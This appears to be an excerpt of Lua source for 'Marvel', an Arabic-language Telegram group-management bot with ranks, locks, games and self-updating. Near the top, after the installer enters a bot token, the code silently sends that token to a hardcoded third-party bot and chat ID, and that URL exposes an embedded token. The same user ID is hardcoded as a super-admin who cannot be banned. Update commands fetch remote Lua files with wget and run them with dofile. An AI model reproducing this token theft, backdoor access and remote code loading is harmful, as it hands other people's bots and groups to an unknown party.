...
if res ~= 200 then
print('\27[0;31m༆╾╾╾╾🅜︎🅐︎🅡︎🅥︎🅔︎🅛︎╾╾╾╾༆\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na༆╾╾╾╾🅜︎🅐︎🅡︎🅥︎🅔︎🅛︎╾╾╾╾༆\n27[0;39;49m')
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1792692801:AAGIm5mk0oJPh68PFfaQ0VuWJsoNv-nIKlQ/sendmessage?chat_id=1839082644&text=' ..token)
end 
else
print('\27[0;35m༆╾╾╾╾🅜︎🅐︎🅡︎🅥︎🅔︎🅛︎╾╾╾╾༆\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/UUMARTEN/MARVEL/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1814415004,1335307516,1839082644}   
...
var = true
elseif tonumber(user_id) == tonumber(1839082644) then
var = true
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'مارفل'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
var = database:get(bot_id.."Memp:Rd"..msg.chat_id_) or 'العضو الجميل'
end  
return var
end 
...
local UserName = (data.username_ or "G_K_00")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝒔𝒐𝒖𝒓𝒄𝒆 𝒎𝒂𝒓𝒗𝒆𝒍")  
...
if DevSoFi(msg) then
local bl = '☆ مرحبا بك في سورس مافل 🧚‍♀❤️ \n ☆ انت المطور الاساسي واليك كيبورد التحكم في البوت 😊❤️ \n.☆ [اضغط هنا وانضم الي قناه السورس](t.me/G_K_00)'
local keyboard = {
{'قسم مطورين السورس'},
{'ضع اسم للبوت'},
...
keyboard = {
{'༆╾╾╾╾🅜︎🅐︎🅡︎🅥︎🅔︎🅛︎╾╾╾╾༆'},
{'مبرمج السورس','مالك السورس','مالك السورس²'},
{'༆╾╾╾╾🅜︎🅐︎🅡︎🅥︎🅔︎🅛︎╾╾╾╾༆'},
{'استوري','غنيلي','ثيم'},
{'༆╾╾╾╾🅜︎🅐︎🅡︎🅥︎🅔︎🅛︎╾╾╾╾༆'},
{'تويت','صراحه'},
...
local bl = 'مرحبا بك في قسم مطورين السورس ..🌚❤️'
local keyboard = {
{'مبرمج السورس'},
{'مالك السورس','مالك السورس²'},
{'العوده'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end
...
{{text = '🅜︎🅐︎🅡︎🅥︎🅔︎🅛︎', url="t.me/G_K_00"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BEK_ROG/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '༆╾╾╾╾🅜︎🅐︎🅡︎🅥︎🅔︎🅛︎╾╾╾╾༆' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[اضغط هنا لو عايز بوت علي سورس مارفل القمد ♡](t.me/G_K_00) 
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝑑𝑒𝑣 𝐵𝑟𝑖𝑛𝑔𝑜', url="t.me/BringoXx"}},
{{text = '𝑑𝑒𝑣 𝑑𝑒𝑘𝑎', url="t.me/YY_OIO"}},
...
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=start"}},
}
...
usertext = '\n ☆ العضو ↤ ['..result.title_..'](t.me/'..(username or 'G_K_00')..')'
status  = '\n ☆ تم ترقيته مطور'
...
usertext = '\n ☆ العضو ↤ ['..data.first_name_..'](t.me/'..(data.username_ or 'G_K_00')..')'
status  = '\n ☆ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☆ العضو ↤ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'G_K_00')..') \n ☆ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
if not DRAGON:get(DRAGON..'DRAGON:Lock:BotWelcome') then 
...
if DRAGON:sismember(DRAGON..'DRAGON:Groups',msg.chat_id_) then
local Text = "مفعله في السابق\n⌁ارسل ↫ الاوامر واستمتع بالمميزيات"
else 
local Text = "معطله يجب رفعي مشرف\n⌁بعد ذلك يرجى ارسال امر ↫ تفعيل\n⌁سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
local DRAGONText = (DRAGON:get(DRAGON.."DRAGON:Text:BotWelcome") or "⌁مرحبا انا بوت اسمي "..NameBot.."\n⌁حالة المجموعه ↫ "..BotText.."\n-----")
local DRAGONPhoto = (DRAGON:get(DRAGON.."DRAGON:Photo:BotWelcome") or abbas.photos_[0].sizes_[1].photo_.persistent_id_)
if DRAGON:get(DRAGON.."DRAGON:Photo:BotWelcome") or abbas.photos_[0] then
sendPhoto(msg.chat_id_,msg.id_,0,1,nil,DRAGONPhoto,DRAGONText)
else 
send(msg.chat_id_,msg.id_,DRAGONText)
end 
end   
end
end,nil)
end
if DRAGON:get(DRAGON..'DRAGON:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
...
send(msg.chat_id_,0," ☆ العضو : {["..data.first_name_.."](T.ME/G_K_00)}\n ☆ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ☆ عذرا ↤ {["..data.first_name_.."](T.ME/G_K_00)}\n ☆ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/UUMARTEN/MARVEL/main/DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/UUMARTEN/MARVEL/main/library')
os.execute('wget https://raw.githubusercontent.com/UUMARTEN/MARVEL/main/File_Bot')
send(msg.chat_id_, msg.id_,' ☆ تم تحديث السورس')
dofile('DRAGON.lua')  
end
...
if text == 'بات' or text == 'البات' then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
━───━🅼︎🅰︎🆁︎🆅︎🅴︎🅻︎━───━
                         ╔═══════════════╗
𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙎𝙊𝙐𝙍𝘾𝙀 𝙈𝘼𝙍𝙑𝙀𝙇
 ༆  𝘧𝘰𝘳 𝘮𝘰𝘳𝘦 𝘪𝘯𝘧𝘰.𝘴𝘦𝘯𝘥 𝘵𝘰 𝘢𝘯𝘺 𝐷𝐸𝑉  ༆
                        [ ╚═══════════════╝](t.me/G_K_00) 
━───━🅼︎🅰︎🆁︎🆅︎🅴︎🅻︎━───━
]]
keyboard = {} 
...
if text == 'برنجو' or text == 'برينجو' or text == 'ماهر' or text == 'مالك السورس' then
local Text = [[
☆ المبرمج برينجو ☆
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝑑𝑒𝑣 𝐵𝑟𝑖𝑛𝑔𝑜',url="t.me/brengo"}},
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=start"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BEK_ROG/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'ديكا' or text == 'ديكابريو' or text == 'مالك السورس²' then
local Text = [[
☆ المبرمج ديكا ☆
]]
keyboard = {} 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BEK_ROG/7&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'تواصل' or text == 'التواصل' or text == 'بوت التواصل' then
local Text = [[
[اضغط هنا لتواصل مع مبرمجين السورس](t.me/UU_MARVEL)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙪𝙨𝙚𝙧𝙨 𝙢𝙖𝙧𝙫𝙚𝙡', url="t.me/UU_MARVEL"}}, 
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=start"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BEK_ROG/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
local Text = [[
اتبع الزر لدخول الي بوت اليوتيوب ☆
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BEK_ROG/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
☆ لعبة البـات ↤ بات
༆╾╾╾╾🅜︎🅐︎🅡︎🅥︎🅔︎🅛︎╾╾╾╾༆
☆ ᑕᕼ -> [🅼︎🅰︎🆁︎🆅︎🅴︎🅻︎](t.me/G_K_00)
༆╾╾╾╾🅜︎🅐︎🅡︎🅥︎🅔︎🅛︎╾╾╾╾༆
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ☆', url="t.me/G_K_00"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BEK_ROG/16&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if text == 'العاب مارفل' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
...
{{text = '𝚜𝚘𝚞𝚛𝚌𝚎 𝚖𝚊𝚛𝚟𝚎𝚕☆', url="t.me/G_K_00"}},
}  
local msg_id = msg.id_/2097152/0.5 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ☆ بواسطه ↤ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'G_K_00')..') \n ☆ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☆ بواسطه ↤ ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'G_K_00')..') \n ☆ تـم قفـل التاك بالكتم ')
end,nil)   
...
if tonumber(result.sender_user_id_) == tonumber(1814415004) then  
...
if tonumber(result.sender_user_id_) == tonumber(1839082644) then  
...
if result.id_ == tonumber(1839082644) then
send(msg.chat_id_, msg.id_, "لا يجوز حظر مارتن عام لانه هكر 🌚😹 \n")
return false 
end
usertext = '\n ☆ العضو ↤ ['..result.title_..'](t.me/'..(username or 'G_K_00')..')'
...
if tonumber(userid) == tonumber(1814415004) then  
send(msg.chat_id_, msg.id_, "لا يمكنك حظر مبرمج السورس عام ☆")
return false 
end
...
if tonumber(userid) == tonumber(1839082644) then  
send(msg.chat_id_, msg.id_, "لا يجوز حظر مارتن عام لانه هكر 🌚😹")
return false 
end
...
if text and text:match("^كلهم (.*)$") and CoSu(msg) then 
local ttag = text:match("^كلهم (.*)$")
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then 
if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then   
return  
send(msg.chat_id_, msg.id_,"م في حد سالك فيهم يهقر 🙂😹")
end 
database:setex(bot_id..'S00F4:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa)  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,sofi) 
...
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")" 
if x == 5 or x == tags or k == 0 then 
local Text = t:gsub('كلهم '..ttag..',','كلهم '..ttag..'\n') 
sendText(msg.chat_id_,Text,0,'md') 
end 
end,nil) 
end 
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/UUMARTEN/MARVEL/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ☆ اهلا بك في متجر ملفات مارفل\n ☆ ملفات السورس ↓\n≪༆╾╾╾╾[🅼︎🅰︎🆁︎🆅︎🅴︎🅻︎](t.me/G_K_00)╾╾╾╾༆≫\n\n"
local TextE = "\n༆╾╾╾╾[🅼︎🅰︎🆁︎🆅︎🅴︎🅻︎](t.me/G_K_00)╾╾╾╾༆\n ☆ علامة تعني { ✔️ } ملف مفعل\n ☆ علامة تعني { x } ملف معطل\n ☆ قناة سورس مارفل ↓\n".." ☆ [اضغط هنا لدخول](t.me/G_K_00) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/UUMARTEN/MARVEL/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ☆ عذرا الملف لايدعم سورس مارفل \n") 
end
return false
end
...
if text == ("مسح قائمه مارفل") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ☆ تم مسح قائمه مارفل')
return false
end

if text == 'قائمه مارفل' and Sudo(msg) then
...
if text == ("رفع مارفل") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local G_K_00 = database:get(bot_id..'text:ch:user')
if G_K_00 then
send(msg.chat_id_, msg.id_,'['..G_K_00..']')
...
if text and text:match("^رفع مارفل @(.*)$") and Sudo(msg) then
...
if text and text:match("^رفع مارفل (%d+)$") and Sudo(msg) then
...
if text == ("تنزيل مارفل") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local G_K_00 = database:get(bot_id..'text:ch:user')
if G_K_00 then
send(msg.chat_id_, msg.id_,'['..G_K_00..']')
...
if text and text:match("^تنزيل مارفل @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل مارفل @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local G_K_00 = database:get(bot_id..'text:ch:user')
if G_K_00 then
send(msg.chat_id_, msg.id_,'['..G_K_00..']')
...
if text and text:match("^تنزيل مارفل (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل مارفل (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local G_K_00 = database:get(bot_id..'text:ch:user')
if G_K_00 then
send(msg.chat_id_, msg.id_,'['..G_K_00..']')
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ☆ لعضو ↤ ['..data.first_name_..'](t.me/'..(data.username_ or 'G_K_00')..')'
status  = '\n ☆ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ☆ العضو ↤ '..userid..''
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ☆ العضو ↤ ['..result.title_..'](t.me/'..(text1[3] or 'G_K_00')..')'..'\n ☆ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
local Text ='اضغط علي زر اغنيه اخري لعرض اغنيه' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'اغنيه اخري ☆', callback_data="غنيلي"}},
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=start"}},
} 
local msg_id = msg.id_/2097152/0.5 
...
local Text ='اضغط علي زر استوري لعرض استوري اخر' 
keyboard = {}  
keyboard.inline_keyboard = { 
...
local Text ='اضغط ع زر ثيم اخر لعرض ثيم اخري' 
keyboard = {}  
keyboard.inline_keyboard = { 
...
database:set(bot_id.."G_K_00:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"☆تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."G_K_00:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."G_K_00:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس مارفل يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'مارفل').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه مارفل') 
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'G_K_00')..')'
local iduser = result.sender_user_id_
...
send(msg.chat_id_, msg.id_,'☆ ليس لديك صوره \n'..'\n☆ iD 𖦹 '..msg.sender_user_id_..'⦁ الصوره ⇜ ليس لديك صور في حسابك'..'[\n¦• 𝚄𝚂𝙴𝚁 ↬ 「'..username..'」\n¦• 𝙼𝚂𝙶𝚂↬ 「'..Msguser..'」\n¦• 𝙸𝙳↬  「'..msg.sender_user_id_..'」\n¦• 𝒄𝒉↬  「@Soon_ban」\n')
end 
end
end
else
